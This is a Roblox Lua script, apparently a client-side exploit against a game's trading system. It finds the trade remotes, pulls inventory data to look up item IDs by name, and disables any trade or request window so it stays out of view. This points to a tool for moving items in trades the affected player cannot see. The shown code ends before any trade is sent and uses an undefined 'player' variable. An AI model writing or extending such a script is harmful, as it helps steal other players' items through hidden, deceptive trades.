local RS = game:GetService("ReplicatedStorage")
local Trade = RS:FindFirstChild("Trade")
if not Trade then print("Trade folder not found"); return end

local SendReq = Trade:FindFirstChild("SendRequest")
local AcceptReq = Trade:FindFirstChild("AcceptRequest")
local StartTr = Trade:FindFirstChild("StartTrade")
local AcceptTr = Trade:FindFirstChild("AcceptTrade")
local CompleteTr = Trade:FindFirstChild("CompleteTrade")
local OfferItem = Trade:FindFirstChild("OfferItem")

if not SendReq or not AcceptReq then print("Missing critical remotes"); return end

-- --- Get inventory and find item ID by name
local function findItemIdByName(itemName)
    -- Try GetProfileData first
    local InventoryFolder = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Inventory")
    local GetProfileData = InventoryFolder and InventoryFolder:FindFirstChild("GetProfileData")
    local GetFullInventory = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Extras") and RS.Remotes.Extras:FindFirstChild("GetFullInventory")

    local function searchTable(tbl)
        if type(tbl) ~= "table" then return nil end
        -- Look for a table with Name = itemName
        for k, v in pairs(tbl) do
            if type(v) == "table" and v.Name and v.Name:lower() == itemName:lower() then
                if v.ID then return v.ID
                elseif v.ItemId then return v.ItemId
                elseif v.Id then return v.Id
                else
                    -- Maybe the key itself is the ID
                    if type(k) == "number" and k > 0 then return k end
                end
            end
            -- If the key is a string and contains the item name, maybe it's the ID
            if type(k) == "string" and k:lower():find(itemName:lower()) then
                -- Try to extract a number from the string
                local id = tonumber(k:match("%d+"))
                if id then return id end
            end
            -- Recurse into tables
            if type(v) == "table" then
                local found = searchTable(v)
                if found then return found end
            end
        end
        return nil
    end

    if GetProfileData then
        local ok, data = pcall(function() return GetProfileData:InvokeServer() end)
        if ok and data then
            print("Got inventory via GetProfileData")
            local id = searchTable(data)
            if id then
                print("Found ID for " .. itemName .. ": " .. tostring(id))
                return id
            end
        end
    end
    if GetFullInventory then
        local ok, data = pcall(function() return GetFullInventory:InvokeServer() end)
        if ok and data then
            print("Got inventory via GetFullInventory")
            local id = searchTable(data)
            if id then
                print("Found ID for " .. itemName .. ": " .. tostring(id))
                return id
            end
        end
    end
    -- If not found, return nil
    return nil
end

-- --- Hide trade GUI (once)
local function hideTradeWindow()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return end
    for _, obj in pairs(gui:GetDescendants()) do
        if obj:IsA("ScreenGui") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
            obj.Enabled = false
        end
        if obj:IsA("Frame") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
            obj.Visible = false
        end
    end
end

